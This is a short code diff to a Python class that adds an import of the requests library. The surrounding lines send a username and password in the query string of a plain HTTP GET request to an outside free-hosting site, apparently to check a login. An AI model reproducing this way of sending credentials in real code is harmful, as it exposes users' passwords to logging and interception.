@@ -104,6 +104,7 @@ class web_source:
         web.us = us
         web.pas = pas
         web.url = "http://oo-ozo.000webhostapp.com/welcome.php?na="+web.us+"&pa="+web.pas
+        import requests as r 
         web.p = r.get(web.url)
 
 class file_readwrite:
